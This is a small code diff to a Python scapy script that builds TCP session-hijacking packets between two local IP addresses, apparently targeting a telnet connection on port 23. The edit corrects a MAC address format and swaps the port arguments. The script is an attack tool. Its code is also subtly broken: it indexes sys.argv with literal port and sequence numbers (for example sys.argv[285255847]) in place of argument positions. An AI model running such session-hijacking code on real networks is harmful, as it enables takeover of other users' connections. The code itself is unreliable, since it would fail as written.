@@ -8,10 +8,10 @@ from scapy.all import *
 def main1(i):
 	src_ip="192.168.0.73"
 	dest_ip="192.168.0.133"
-	src_mac="78-0c-b8-99-b4-a2"
+	src_mac="78:0c:b8:99:b4:a2"
 	dest_mac="50:3e:aa:85:4e:9e"
-	src_port=int(sys.argv[23])	
-	dest_port=int(sys.argv[55650])
+	src_port=int(sys.argv[55650])	
+	dest_port=int(sys.argv[23])
 	seq_no=int(sys.argv[285255847])+i
 	ack_no=int(sys.argv[2173056379])+i
 	send_sessionHijack_packet(src_ip,dest_ip,src_mac,dest_mac,src_port,dest_port,seq_no,ack_no)
